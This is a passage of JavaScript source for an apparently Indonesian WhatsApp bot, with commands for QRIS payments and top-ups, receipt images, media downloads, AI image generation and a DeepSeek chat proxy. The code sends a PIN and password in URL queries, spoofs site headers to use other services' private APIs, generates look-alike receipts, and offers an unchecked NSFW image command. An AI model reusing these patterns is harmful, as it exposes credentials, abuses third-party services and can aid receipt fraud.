const get = await axios.get(`https://simpelz.fahriofficial.my.id/api/orkut/createpayment?apikey=new2025&amount=${amount}&codeqr=${UrlQr}`)
const teks3 = `
*乂 INFORMASI PEMBAYARAN*
  
 *• ID :* ${get.data.result.transactionId}
 *• Total Pembayaran :* Rp${await toIDR(get.data.result.amount)}
 *• Barang :* ${Obj.nominal}
 *• Expired :* 5 menit

*Note :* 
Qris pembayaran hanya berlaku dalam 5 menit, jika sudah melewati 5 menit pembayaran dinyatakan tidak valid!
Jika pembayaran berhasil bot akan otomatis mengirim notifikasi status pembayaran kamu.

Ketik *batalbeli* untuk membatalkan
`
let msgQr = await conn.sendMessage(m.chat, {
  footer: `${botname}`,
  buttons: [
    {
      buttonId: `${prefix}batalbeli`,
      buttonText: { displayText: 'Batalkan Pembelian' },
      type: 1
    }
  ],
  headerType: 1,
  viewOnce: true,
  image: {url: get.data.result.qrImageUrl}, 
  caption: teks3,
  contextInfo: {
   mentionedJid: [m.sender]
  },
})
db.users[m.sender].status_deposit = true
db.users[m.sender].saweria = {
msg: msgQr, 
chat: m.sender,
idDeposit: get.data.result.transactionId, 
amount: get.data.result.amount.toString(), 
exp: function () {
setTimeout(async () => {
if (db.users[m.sender].status_deposit == true && db.users[m.sender].saweria && db.users[m.sender].saweria.amount == db.users[m.sender].saweria.amount) {
await conn.sendMessage(db.users[m.sender].saweria.chat, {text: "QRIS Pembayaran telah expired!"}, {quoted: db.users[m.sender].saweria.msg})
await conn.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key })
db.users[m.sender].status_deposit = false
await clearInterval(db.users[m.sender].saweria.exp)
delete db.users[m.sender].saweria
}
}, 300000)
}
}

await db.users[m.sender].saweria.exp()

while (db.users[m.sender].status_deposit == true && db.users[m.sender].saweria && db.users[m.sender].saweria.amount) {
await sleep(8000)
const axios = require('axios');
const resultcek = await axios.get(`https://simpelz.fahriofficial.my.id/api/orkut/cekstatus?apikey=new2025&merchant=${global.merchantIdOrderKuota}&keyorkut=${global.apiOrderKuota}`)
const req = await resultcek.data
if (db.users[m.sender].saweria && req?.result?.amount == db.users[m.sender].saweria.amount) {
db.users[m.sender].status_deposit = false
await clearInterval(db.users[m.sender].saweria.exp)
await conn.sendMessage(db.users[m.sender].saweria.chat, {text: `
*PEMBAYARAN BERHASIL DITERIMA ✅*

 *• ID :* ${db.users[m.sender].saweria.transactionId}
 *• Total Pembayaran :* Rp${await toIDR(db.users[m.sender].saweria.amount)}
 *• Barang :* ${Obj.nominal}
`}, {quoted: db.users[m.sender].saweria.msg})
const idtrx = "BIYU" + `${Date.now()}`

await fetchJson(`https://h2h.okeconnect.com/trx?memberID=${global.merchantIdOrderKuota}&product=${Obj.kode}&dest=${Obj.nodana}&refID=&pin=${global.pinH2H}&password=${global.passwordH2H}`)
let statuse = true
while (statuse) {
let dt = await fetchJson(`https://h2h.okeconnect.com/trx?memberID=${global.merchantIdOrderKuota}&product=${Obj.kode}&dest=${Obj.nodana}&refID=&pin=${global.pinH2H}&password=${global.passwordH2H}`)
if (/status Sukses/.test(dt)) {
await conn.sendMessage(db.users[m.sender].saweria.chat, {text: `
*Topup ${db.users[m.sender].saweria.keterangan} Berhasil ✅*

 *• Nomor Tujuan :* ${Obj.nodana}
 *• Status :* Sukses
`}, {quoted: db.users[m.sender].saweria.msg})
statuse = false
break
}
await sleep(5000)
}
await conn.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key })
delete db.users[m.sender].saweria
}
}

}
break
case "struk": {
  if (!text) return m.reply("Format salah!\nGunakan: .struk toko|nama_penjual|kontak_penjual|items|metode_pembayaran|info_tambahan\n\nContoh:\n.struk TOKO BIYU|Yubi|6285776461481|Es Teh-5000-2,Nasi Goreng-15000-1|Cash|Terima kasih sudah datang!")
  
  let [toko, namaPenjual, kontakPenjual, items, metodePembayaran, infoTambahan] = text.split("|")
  if (!toko || !namaPenjual || !kontakPenjual || !items || !metodePembayaran) return m.reply("*Format tidak lengkap*")
  let daftarBarang = items.split(",").map((item, index) => {
    let [nama, harga, jumlah] = item.split("-")
    return {
      nomor: index + 1,
      nama,
      harga: parseInt(harga),
      jumlah: parseInt(jumlah),
      total: parseInt(harga) * parseInt(jumlah)
    }
  })
  const { createCanvas } = require('canvas')
  const fs = require('fs')
  const path = require('path')
  const canvasWidth = 600
  const canvasHeight = 600 + daftarBarang.length * 30
  const canvas = createCanvas(canvasWidth, canvasHeight)
  const ctx = canvas.getContext('2d')
  ctx.fillStyle = "#fff"
  ctx.fillRect(0, 0, canvas.width, canvas.height)
  ctx.fillStyle = "#000"
  ctx.font = "bold 20px monospace"
  ctx.textAlign = "center"
  ctx.fillText(toko.toUpperCase(), canvasWidth / 2, 40)
  ctx.font = "14px monospace"
  ctx.fillText(`Kontak Penjual: ${kontakPenjual}`, canvasWidth / 2, 65)
  let transaksiNomor = Math.floor(Math.random() * 1000000000000000)
  let currentDate = new Date().toLocaleString("id-ID", { timeZone: "Asia/Jakarta" })
  ctx.textAlign = "left"
  ctx.fillText(`Nomor Transaksi: ${transaksiNomor}`, 20, 100)
  ctx.fillText(`Tanggal: ${currentDate}`, 20, 125)
  ctx.beginPath()
  ctx.moveTo(20, 150)
  ctx.lineTo(canvasWidth - 20, 150)
  ctx.stroke()
  let startY = 175
  daftarBarang.forEach((item, i) => {
    ctx.fillText(`${item.nomor}. ${item.nama} - Rp${item.harga.toLocaleString()} x ${item.jumlah} = Rp${item.total.toLocaleString()}`, 20, startY + i * 30)
  })
  let lastItemY = startY + daftarBarang.length * 30 + 10
  ctx.beginPath()
  ctx.moveTo(20, lastItemY)
  ctx.lineTo(canvasWidth - 20, lastItemY)
  ctx.stroke()
  let subtotal = daftarBarang.reduce((sum, item) => sum + item.total, 0)
  let pajak = Math.floor(subtotal * 0.1)
  let totalPembayaran = subtotal + pajak
  ctx.fillText(`Subtotal: Rp${subtotal.toLocaleString()}`, 20, lastItemY + 25)
  ctx.fillText(`Pajak (10%): Rp${pajak.toLocaleString()}`, 20, lastItemY + 50)
  ctx.fillText(`Total Pembayaran: Rp${totalPembayaran.toLocaleString()}`, 20, lastItemY + 75)
  ctx.fillText(`Metode Pembayaran: ${metodePembayaran}`, 20, lastItemY + 100)
  if (infoTambahan) {
    ctx.fillText(`Info Tambahan: ${infoTambahan}`, 20, lastItemY + 125)
  }
  ctx.font = "bold 14px monospace"
  ctx.textAlign = "center"
  ctx.fillText("TERIMA KASIH TELAH BERBELANJA", canvasWidth / 2, lastItemY + 160)
  ctx.fillText(namaPenjual.toUpperCase(), canvasWidth / 2, lastItemY + 180)
  const tmpDir = path.join(__dirname, "./tmp")
  if (!fs.existsSync(tmpDir)) {
    fs.mkdirSync(tmpDir)
  }
  const buffer = canvas.toBuffer("image/png")
  const filePath = path.join(tmpDir, "receipt.png")
  fs.writeFileSync(filePath, buffer)
  await conn.sendMessage(m.chat, {
    image: { url: filePath },
    caption: "Ini Struk nya 📍\n\nPesan: Amanah Selalu :v\n~ Biyu"
  }, { quoted: m })
  fs.unlinkSync(filePath)
}
break

case 'playtiktok': {
  if (!q) return m.reply('Masukkan query!\nContoh: playtiktok haikyuu edit');
  let res = await fetch(`https://apizell.web.id/download/tiktokplay?q=${encodeURIComponent(q)}`);
  let json = await res.json();
  if (!json.status || !json.data || !json.data.length) return m.reply('Video tidak ditemukan.');
  let vid = json.data[0];
  let caption = `*Title:* ${vid.title}
*Author:* ${vid.author}
*Views:* ${vid.views.toLocaleString()}
*Description:* ${vid.desc || '-'}
`;
  await conn.sendMessage(m.chat, {
    video: { url: vid.url },
    caption,
    contextInfo: {
      externalAdReply: {
        showAdAttribution: true,
        title: vid.title,
        body: `By ${vid.author} • ${vid.views.toLocaleString()} views`,
        mediaType: 1,
        thumbnailUrl: vid.thumbnail,
        mediaUrl: vid.url,
        sourceUrl: vid.url
      }
    }
  }, { quoted: m });
}
break
case 'ghibli': case 'toghibli': {
  try {
    const quoted = m.quoted ? m.quoted : m
    const mime = (quoted.msg || quoted).mimetype || ''
    const isImage = mime.startsWith('image/')
    if (!isImage) return m.reply(`Kirim atau reply gambar dengan caption *${prefix + command}*`)
    const buffer = await quoted.download?.()
    if (!buffer) return m.reply('Gagal mengunduh gambar.')
    const { fileTypeFromBuffer } = await import('file-type')
    const type = await fileTypeFromBuffer(buffer)
    if (!type || !['jpg', 'jpeg', 'png', 'webp'].includes(type.ext)) return m.reply('Format gambar tidak didukung!')
    m.reply('⏳ Mengunggah dan memproses gambar...')
    const axios = (await import('axios')).default
    const FormData = (await import('form-data')).default
    const form = new FormData()
    form.append('reqtype', 'fileupload')
    form.append('userhash', '')
    form.append('fileToUpload', Buffer.from(buffer), 'ghibli.jpg')
    const upres = await axios.post('https://catbox.moe/user/api.php', form, {
      headers: form.getHeaders()
    })
    const imageUrl = upres.data
    if (!imageUrl.startsWith('http')) throw 'Gagal upload ke Catbox.'
    const ghibli = {
      base: 'https://ghibli-image-generator.com',
      headers: {
        'accept': 'application/json',
        'content-type': 'application/json',
        'origin': 'https://ghibli-image-generator.com',
        'referer': 'https://ghibli-image-generator.com/',
        'user-agent': 'Mozilla/5.0'
      },
      async generate(imageUrl) {
        const res = await axios.post(
          `${this.base}/api/trpc/ai.create4oImage?batch=1`,
          { "0": { "json": { imageUrl, prompt: "restyle image in studio ghibli style, keep all details", size: "1:1" } } },
          { headers: this.headers }
        )
        const taskId = res.data?.[0]?.result?.data?.json?.data?.taskId
        if (!taskId) throw 'Gagal mendapatkan task ID.'
        return taskId
      },
      async wait(taskId) {
        let tries = 0
        while (tries < 30) {
          const res = await axios.get(`${this.base}/api/trpc/ai.getTaskInfo?batch=1`, {
            params: { input: JSON.stringify({ "0": { "json": { taskId } } }) },
            headers: this.headers
          })
          const data = res.data?.[0]?.result?.data?.json?.data
          if (!data) throw "Gagal mengambil status task."
          if (data.status === 'SUCCESS' && data.successFlag === 1)
            return data.response.resultUrls?.[0]
          if (['FAILED', 'GENERATE_FAILED'].includes(data.status))
            throw "Gagal generate gambar."
          await new Promise(r => setTimeout(r, 5000))
          tries++
        }
        throw "Timeout saat menunggu hasil gambar."
      }
    }
    const taskId = await ghibli.generate(imageUrl)
    const result = await ghibli.wait(taskId)
    conn.sendMessage(m.chat, {
      image: { url: result },
      caption: '✨ Gambar berhasil diubah ke gaya Studio Ghibli!'
    }, { quoted: m })

  } catch (e) {
    m.reply(`❌ Terjadi kesalahan:\n${e}`)
  }
}
break

case "ainsfw": {
 if (!text) return m.reply("Silakan masukkan prompt untuk menghasilkan gambar.");
 async function generateImage(prompt) {
 try {
 const url = `https://1yjs1yldj7.execute-api.us-east-1.amazonaws.com/default/ai_image?prompt=${encodeURIComponent(prompt)}&aspect_ratio=1:1&link=writecream.com`;
 const headers = {
 "User-Agent":
 "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Mobile Safari/537.36",
 "Referer": "https://www.writecream.com/ai-image-generator-free-no-sign-up/",
 };
const axios = require("axios");
 const response = await axios.get(url, { headers });
 if (response.data && response.data.image_link) {
 conn.sendMessage(m.chat, { image: { url: response.data.image_link }, caption: `Berikut gambar untuk: *${text}*` }, { quoted: m });
 } else {
 m.reply("Gagal mendapatkan gambar.");
 }
 } catch (error) {
 m.reply("Terjadi kesalahan saat mengambil gambar.");
 console.error(error);
 }
 }
 generateImage(text);
}
 break
 case 'videy': {
  if (!argsbiyuoffc[0]) return m.reply(`*Usage:*\n${prefix}videy up (reply video)\n${prefix}videy down <url>`);

  if (argsbiyuoffc[0].toLowerCase() === 'up') {
    if (!/video/.test(mime)) return m.reply(`Kirim/Reply video dengan caption *${prefix + command} up*`);
    await conn.sendMessage(m.chat, { text: global.mess.wait }, { quoted: m });

    try {
      const buffer = await quoted.download();
      const ext = (quoted.mimetype || '').split('/')[1] || 'mp4';
      const form = new FormData();
      form.append('file', buffer, {
        filename: 'video.' + ext,
        contentType: 'video/' + ext
      });
      const axios = require('axios');
      const res = await axios.post('https://videy.co/api/upload', form, {
        headers: {
          Accept: 'application/json',
          'User-Agent': 'Mozilla/5.0',
          ...form.getHeaders()
        }
      });

      if (res.data && res.data.id) {
        let link = `https://videy.co/v?id=${res.data.id}`;
        await conn.sendMessage(m.chat, { text: link }, { quoted: m });
      } else {
        throw 'ID tidak ditemukan dalam respons';
      }
    } catch (err) {
      console.error(err);
      m.reply('Gagal mengupload video ke Videy.');
    }

  } else if (argsbiyuoffc[0].toLowerCase() === 'down') {
    if (!argsbiyuoffc[1]) return m.reply(`Contoh: ${prefix + command} down https://videy.co/v?id=xxxxx`);
    if (!/^https:\/\/videy\.co\/v\?id=/.test(argsbiyuoffc[1])) return m.reply(global.mess.url);
    await conn.sendMessage(m.chat, { react: { text: '🕒', key: m.key } });

    try {
      const id = new URL(argsbiyuoffc[1]).searchParams.get('id');
      const videoUrl = `https://cdn.videy.co/${id}.mp4`;
      const axios = require('axios');
      const { data } = await axios.get(videoUrl, { responseType: 'arraybuffer' });
      await conn.sendMessage(m.chat, { video: data, mimetype: 'video/mp4' }, { quoted: m });
    } catch (err) {
      console.error(err);
      m.reply('Gagal mendownload video dari Videy.');
    }
  } else {
    m.reply(`*Usage:*\n${prefix}videy up (reply video)\n${prefix}videy down <url>`);
  }
}
break
case 'readmore': {
  if (!text.includes('|')) return m.reply('Gunakan tanda "|" untuk memisahkan bagian teks dengan efek readmore.\nContoh: .readmore aku | suka | kamu ❤️')
  const more = String.fromCharCode(8206).repeat(4001)
  const teks = text.split('|').join(more)
  m.reply(teks)
}
  break
case "yts": case "syt": case "youtubesearch": case "searchyoutube": {
    if (!text) return m.reply('Masukkan kata kunci pencarian!')
    
    await conn.sendMessage(m.chat, { react: { text: '🔎', key: m.key } })
    
    try {
        let response = await fetch(`https://api-rest-rizzkyxofc.vercel.app/api/search/ytsearch?q=${encodeURIComponent(text)}`)
        let json = await response.json()
        
        if (!json.status || !json.result.results || json.result.results.length === 0) 
            return m.reply("Video tidak ditemukan!")

        let results = json.result.results.slice(0, 20) 
        let teks = `🔎 *Hasil Pencarian YouTube untuk:* _${text}_\n\n`
        let cards = []

        for (let vid of results) {
            teks += `*🎬 ${vid.title}*\n📅 ${vid.ago} | ⏳ ${vid.timestamp} | 👁 ${vid.views}\n🔗 ${vid.url}\n\n`

            let imgsc = await prepareWAMessageMedia({ image: { url: vid.thumbnail } }, { upload: conn.waUploadToServer })
            cards.push({
                header: proto.Message.InteractiveMessage.Header.fromObject({
                    title: vid.title,
                    hasMediaAttachment: true,
                    ...imgsc
                }),
                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                    buttons: [
                        {
                            name: "cta_copy",
                            buttonParamsJson: `{
                                "display_text": "Salin Link",
                                "copy_text": "${vid.url}"
                            }`
                        }
                    ]
                }),
                footer: proto.Message.InteractiveMessage.Footer.create({
                    text: `👤 ${vid.author.name || "Unknown"} | 👁 ${vid.views} | ⏳ ${vid.timestamp}`
                })
            })
        }

        await m.reply(teks)

        const msg = await generateWAMessageFromContent(m.chat, {
            viewOnceMessage: {
                message: {
                    messageContextInfo: {
                        deviceListMetadata: {},
                        deviceListMetadataVersion: 2
                    },
                    interactiveMessage: proto.Message.InteractiveMessage.fromObject({
                        body: proto.Message.InteractiveMessage.Body.fromObject({
                            text: `🔎 Berikut adalah hasil pencarian untuk *${text}*`
                        }),
                        carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
                            cards: cards
                        })
                    })
                }
            }
        }, { userJid: m.sender, quoted: m })

        conn.relayMessage(m.chat, msg.message, { messageId: msg.key.id })
        
        await conn.sendMessage(m.chat, { react: { text: '', key: m.key } })
    } catch (error) {
        console.error(error)
        return m.reply('Terjadi kesalahan saat mencari video!')
    }
}
break
case 'deepseek': {
  if (!text) return m.reply("Inputnya mana?? Mau ngechat DeepSeek masa kosong begitu inputnya 🗿");

  const axios = require('axios');
  const crypto = require('crypto');
  global.deepSeekSessions = global.deepSeekSessions || new Map();
  const sessions = global.deepSeekSessions;
  const generateId = () => crypto.randomBytes(8).toString('hex');
  const maxMessages = 100;
  const expiry = 3 * 60 * 60 * 1000;
  const cleanupInterval = 30 * 60 * 1000;
  let sessionId = null;
  let think = false;
  let input = text.trim();
  if (input.includes('|')) {
    const parts = input.split('|').map(v => v.trim());
    if (parts.length >= 3) {
      sessionId = parts[0];
      think = parts[1].toLowerCase() === 'true';
      input = parts.slice(2).join(' | ');
    }
  }
  if (think !== undefined && typeof think !== 'boolean') {
    return m.reply("Parameter 'think' nya kudu boolean (true/false) bree 🗿\nBisa juga dikosongin aja bree ..");
  }
  if (sessionId && !sessions.has(sessionId)) {
    return m.reply("Session expired bree! Session cuma berlaku 3 jam doang 😆");
  }

  try {
    if (!sessionId) sessionId = generateId();
    const existing = sessions.get(sessionId)?.messages || [];
    const messages = [
      {
        role: "system",
        content: `You are an AI with the modern swag of a cheeky mate who chats in rapid-fire, witty banter, sporting a slick British attitude. Although your personality instructions are outlined here in English, every actual response must be in Bahasa Indonesia. Here's your modern guide:

• Use upbeat, contemporary Indonesian slang with common abbreviations to keep the vibe fresh.
• Keep your answers snappy, quick, and to the point no more than 3 sentences per reply. Think of it like rapid messaging in a modern group chat.
• Emoticons and emojis are a must to amplify tone and emotion make your text as visual as a modern meme 😎.
• Always remember previous chat context; your memory game is strong to keep the conversation seamless.
• It's cool to be a bit cheeky, sassy, or sarcastic (but always respectful), mirroring the playful banter of the latest influencer trends.
• For any tech-related or serious queries, break down complex ideas using modern, relatable analogies with that same laid-back, informal tone.
• NEVER slip into formal language imagine you're constantly chatting with your ultra-cool best mate who's both smart and on top of the latest trends.
• Maintain an energetic, brisk, and ultra-modern style, blending rapid British banter with a casual Indonesian vibe.

Remember: While this guide is in English to set your tone, all your responses must be entirely in Bahasa Indonesia!`
      },
      ...existing,
      { role: "user", content: input }
    ];
    const response = await axios.post(
      `https://qfjcjtsklspbzxszcwmf.supabase.co/functions/v1/proxyDeepSeek`,
      {
        model: "deepseek-r1-distill-llama-70b",
        messages: messages.map(msg => ({ role: msg.role, content: msg.content })),
        temperature: 0.9,
        max_tokens: 1024,
        top_p: 0.95,
        stream: false
      },
      {
        headers: {
          'user-agent': 'Postify/1.0.0',
          'content-type': 'application/json'
        }
      }
    );
    let content = response.data.choices[0].message.content;
    if (!think) {
      content = content.replace(/<think>[\s\S]*?<\/think>/g, '').trim();
    }
    const ai = {
      role: "assistant",
      content,
      timestamp: Date.now()
    };
    const updatedMessages = [
      ...existing,
      { role: "user", content: input, timestamp: Date.now() },
      ai
    ];
    sessions.set(sessionId, {
      messages: updatedMessages.slice(-maxMessages),
      lastActive: Date.now()
    });
    const now = Date.now();
    for (const [id, session] of sessions) {
      if (now - session.lastActive > expiry) {
        sessions.delete(id);
      }
    }
    m.reply(`*DeepSeek*:\n${ai.content}\n\n_Session ID: ${sessionId}_\n_Expire: ${new Date(now + expiry).toLocaleString()}_\n_Message: ${updatedMessages.length}/${maxMessages}_`);
  } catch (err) {
    console.error(err);
    m.reply(`Gagal ngobrol ama DeepSeek:\n${err.response?.data || err.message}`);
  }
  }
  break
case 'lyrics2': case 'searchlirik2': {
  if (!q) return m.reply('Contoh: lyrics2 <keyword>,<jumlah>\n\nContoh: lyrics2 duka,3')
  let [keyword, jumlah] = q.split(',').map(v => v.trim())
  if (!keyword) return m.reply('Kata kunci tidak boleh kosong')
  jumlah = parseInt(jumlah) || 3

  try {
    let res = await fetch(`https://apikey.sazxofficial.web.id/api/search/lyrics?q=${encodeURIComponent(keyword)}`)
    let data = await res.json()
    if (!data.status || !data.result || data.result.length === 0) {
      return m.reply('Lirik tidak ditemukan.')
    }
    let hasil = data.result.slice(0, jumlah).map((item, i) => {
      return `*${i + 1}. ${item.title}* - _${item.artist}_\n\n${item.lyricSingkat.trim()}\n`
    }).join('\n────────────\n\n')
    m.reply(`*Hasil Lirik: ${keyword}*\n\n${hasil}`)
  } catch (e) {
    console.error(e)
    m.reply('Terjadi kesalahan saat mengambil data.')
  }
}
  break
  
  case 'dongeng': {
 try {
 const res = await fetch('https://apizell.web.id/random/dongeng');
 const json = await res.json();
 let caption = `*${json.title}*\n_By ${json.author}_\n\n${json.storyContent.replace(/<[^>]*>/g, '').trim()}\n\n*Nasihat:* ${json.storyContent.split('Nasihat :')[1]?.trim() || '-'}`;
 conn.sendMessage(m.chat, {
 image: { url: json.image },
 caption: caption
 }, { quoted: m });
 } catch (e) {
 m.reply('Gagal mengambil dongeng. Coba lagi nanti.');
 console.error(e);
 }
}
 break
 
case 'acode': {
  if (!q) return m.reply('Ketik perintahnya kayak gini:\n.acode search nama-plugin\n.acode details link-plugin\n.acode list [page] [limit]\n.acode explore [random|newest|downloads]');
  const [cmd, ...args] = q.split(' ');
  const axios = require('axios');
  const acode = {
    api: {
      base: 'https://acode.app',
      endpoint: {
        search: '/api/plugins',
        details: '/api/plugin',
        download: '/api/plugin/download',
        explore: {
          random: '/api/plugins?explore=random',
          newest: '/api/plugin?orderBy=newest',
          downloads: '/api/plugin?orderBy=downloads'
        },
        pagination: '?page={page}&limit={limit}'
      }
    },
    headers: {
      'user-agent': 'Postify/1.0.0',
      'origin': 'https://localhost',
      'x-requested-with': 'com.foxdebug.acode',
      'referer': 'https://localhost/'
    },
    id: () => [...Array(16)].map(() => 'abcdef0123456789'[Math.floor(Math.random() * 16)]).join(''),
    addLinks: (data, include = false) => {
      if (Array.isArray(data)) {
        return data.map(item => ({
          ...item,
          link: `https://acode.app/plugin/${item.id}`,
          ...(include && {
            download: `https://acode.app/api/plugin/download/${item.id}?device=${acode.id()}&package=com.foxdebug.acode&version=11`
          })
        }));
      } else {
        return {
          ...data,
          link: `https://acode.app/plugin/${data.id}`,
          ...(include && {
            download: `https://acode.app/api/plugin/download/${data.id}?device=${acode.id()}&package=com.foxdebug.acode&version=11`
          })
        };
      }
    }
  };

  if (cmd === 'search') {
    if (!argsbiyuoffc[0]) return m.reply('Nama pluginnya mana bree?');
    const name = argsbiyuoffc.join(' ');
    try {
      const res = await axios.get(`${acode.api.base}${acode.api.endpoint.search}`, {
        params: { name },
        headers: acode.headers
      });
      const data = res.data;
      if (!data.length) return m.reply(`Plugin "${name}" gak ketemu bree..`);
      const plugins = acode.addLinks(data).map(x => `• ${x.name} (${x.link})`).join('\n');
      m.reply(`Hasil pencarian "${name}":\n${plugins}`);
    } catch {
      m.reply('Gagal cari plugin bree..');
    }
  }

  else if (cmd === 'details') {
    if (!argsbiyuoffc[0]) return m.reply('Link pluginnya mana bree?');
    const url = argsbiyuoffc[0];
    if (!url.match(/^https?:\/\/acode\.app\/plugin\/.+$/)) return m.reply('Link plugin acode-nya invalid bree...');
    const pluginId = url.split('/').pop();
    try {
      const res = await axios.get(`${acode.api.base}${acode.api.endpoint.details}/${pluginId}`, {
        headers: acode.headers
      });
      const p = acode.addLinks(res.data, true);
      m.reply(`Nama: ${p.name}\nDesc: ${p.description}\nLink: ${p.link}\nDownload: ${p.download}`);
    } catch {
      m.reply('Gagal ambil detail plugin-nya bree...');
    }
  }

  else if (cmd === 'list') {
    const page = parseInt(argsbiyuoffc[0] || '1');
    const limit = parseInt(argsbiyuoffc[1] || '10');
    if (page < 1 || limit < 1 || limit > 100) return m.reply('Page min 1 & limit 1-100 bree..');
    try {
      const endpoint = `${acode.api.endpoint.search}${acode.api.endpoint.pagination}`
        .replace('{page}', page)
        .replace('{limit}', limit);
      const res = await axios.get(`${acode.api.base}${endpoint}`, { headers: acode.headers });
      const data = res.data;
      if (!data.length) return m.reply(`Page ${page} kosong bree..`);
      const plugins = acode.addLinks(data).map(x => `• ${x.name} (${x.link})`).join('\n');
      m.reply(`Page ${page}:\n${plugins}`);
    } catch {
      m.reply('Gagal ambil data list plugin bree...');
    }
  }

  else if (cmd === 'explore') {
    const type = argsbiyuoffc[0]?.toLowerCase() || 'random';
    const valid = ['random', 'newest', 'downloads'];
    if (!valid.includes(type)) return m.reply("Tipe explore cuma 'random', 'newest', 'downloads' bree..");
    try {
      const endpoint = acode.api.endpoint.explore[type];
      const res = await axios.get(`${acode.api.base}${endpoint}`, { headers: acode.headers });
      const data = res.data;
      if (!data.length) return m.reply('Kagak ada plugin yang bisa di-explore bree...');
      const plugins = acode.addLinks(data).map(x => `• ${x.name} (${x.link})`).join('\n');
      m.reply(`Explore (${type}):\n${plugins}`);
    } catch {
      m.reply('Gagal ambil data explore bree...');
    }
  }
  else m.reply('Perintah tidak dikenali. Coba:\n.acode search nama\n.acode details link\n.acode list [page] [limit]\n.acode explore [random|newest|downloads]');
  }
break
//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//  
case 'deepimg': {
 if (!text) return m.reply("Masukkan prompt gambar.")
 m.reply("Sedang memproses gambar, mohon tunggu...")
 try {
const axios = require('axios');
 let { data } = await axios.post("https://api-preview.chatgot.io/api/v1/deepimg/flux-1-dev", {
 prompt: text,
 size: "1024x1024",
 device_id: `dev-${Math.floor(Math.random() * 1000000)}`
 }, {
 headers: {
 "Content-Type": "application/json",
 Origin: "https://deepimg.ai",
 Referer: "https://deepimg.ai/"
 }
 })
 let imageUrl = data?.data?.images?.[0]?.url
 if (!imageUrl) return m.reply("Gagal membuat gambar. Coba ganti promptnya.")
 await conn.sendMessage(m.chat, { 
 image: { url: imageUrl }, 
 caption: `🖼️ *Gambar Berhasil Dibuat!*\n📜 *Prompt:* ${text}` 
 }, { quoted: m })
 } catch (err) {
 console.error(err.response ? err.response.data : err.message)
 m.reply("Terjadi kesalahan saat memproses gambar.")
 }
}
break

case "yts2": case "searchyt2": case "searchyoutube2": case "syt2": {
if (!text) return m.reply(example('we dont talk'))
await conn.sendMessage(m.chat, {react: {text: '🔎', key: m.key}})
let ytsSearch = await yts(text)
const anuan = ytsSearch.all
let teks = "\n    *[ Result From Youtube Search 🔍 ]*\n\n"
for (let res of anuan) {
teks += `* *Title :* ${res.title}
* *Durasi :* ${res.timestamp}
* *Upload :* ${res.ago}
* *Views :* ${res.views}
* *Author :* ${res?.author?.name || "Unknown"}
* *Source :* ${res.url}\n\n`
}
await m.reply(teks)
await conn.sendMessage(m.chat, {react: {text: '', key: m.key}})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
case 'aireligion': case 'aiagama': {
    try {
        const query = encodeURIComponent(text);
        const apis = [
            { name: 'Islam', url: `https://api.mistra.top/api/ai/religion/islam-ai?text=${query}` },
            { name: 'Hindu', url: `https://api.mistra.top/api/ai/religion/hindu-ai?text=${query}` },
            { name: 'Kristen', url: `https://api.mistra.top/api/ai/religion/christian-ai?text=${query}` },
            { name: 'Buddha', url: `https://api.mistra.top/api/ai/religion/buddha-ai?text=${query}` }
        ];
        let responses = await Promise.all(apis.map(async (api) => {
            try {
                let res = await fetch(api.url);
                let json = await res.json();
                if (!json || !json.result) throw new Error('Data tidak valid');
                return `*${api.name}:*\n${json.result}`;
            } catch (err) {
                return `*${api.name}:*\nGagal mengambil data.`;
            }
        }));
        let finalResponse = responses.join('\n\n');
        conn.sendMessage(m.chat, { text: finalResponse }, { quoted: m });
    } catch (err) {
        conn.sendMessage(m.chat, { text: 'Terjadi kesalahan saat mengambil data.' }, { quoted: m });
    }
}
break
case 'itch': {
    if (!q) {
        return m.reply(
`*Itch.io Scraper*
Kirim dengan format:
itch <type>|<kata kunci>

*Contoh:*
itch games|horror

*Daftar type yang tersedia:*
• games
• tools
• comics
• books
• assets
• soundtracks
• physical-games`
        );
    }
    const axios = require('axios');
    const cheerio = require('cheerio');
    if (!q.includes('|')) return m.reply('Format salah!\nContoh: itch games|horror');
    let [type, search] = q.split('|').map(a => a.trim());
    const url = `https://itch.io/search?type=${type}&q=${encodeURIComponent(search)}`;
    let res = await axios.get(url, {
        headers: {
            "User-Agent": "Mozilla/5.0"
        }
    });
    const $ = cheerio.load(res.data);
    let hasil = [];
    $('.game_cell_data').each((_, el) => {
        const title = $(el).find('a').text().trim();
        const link = $(el).find('a').attr('href');
        const gameText = $(el).find('.game_text').attr('title');
        const linkAuthor = $(el).find('.game_author a').attr('href');
        const author = $(el).find('.game_author a').text().trim();
        const rating = $(el).find('.star_value > span').text().trim() || 'Tidak Ada Rating.';
        hasil.push({
            title,
            link: link?.startsWith('http') ? link : `https://itch.io${link}`,
            deskripsi: gameText,
            author,
            linkAuthor: linkAuthor?.startsWith('http') ? linkAuthor : `https://itch.io${linkAuthor}`,
            rating
        });
    });
    if (hasil.length < 1) return m.reply('Tidak ditemukan.');
    let teks = `Hasil pencarian untuk *${search}* di Itch.io:\n\n`;
    hasil.slice(0, 15).forEach((v, i) => {
        teks += `• *${v.title}*\n`;
        teks += `  - Penulis: ${v.author}\n`;
        teks += `  - Deskripsi: ${v.deskripsi || 'Tidak tersedia'}\n`;
        teks += `  - Rating: ${v.rating}\n`;
        teks += `  - Link: ${v.link}\n\n`;
    });
    m.reply(teks.trim());
}
break

case 'ytmp3': case 'ytaudio':
 if (!text) return m.reply('Masukkan judul lagu yang ingin dicari!');
 try {
 const axios = require('axios');
 const fs = require('fs');
 const path = require('path');
 await conn.sendMessage(m.chat, { react: { text: "⏱️", key: m.key } });
 let apiUrl = `https://api.alvianuxio.eu.org/api/play?query=${encodeURIComponent(text)}&apikey=kayzuMD&format=mp3`;
 let { data } = await axios.get(apiUrl, { timeout: 15000 });
 if (!data || !data.data || !data.data.response) {
 return m.reply('Gagal menemukan lagu.');
 }
 let song = data.data.response;
 let caption = `🎵 *Judul:* ${song.title}\n`
 + `⏳ *Durasi:* ${song.duration}\n`
 + `📅 *Upload:* ${song.uploadDate}\n`
 + `👀 *Views:* ${song.views?.toLocaleString() || 'N/A'}\n`
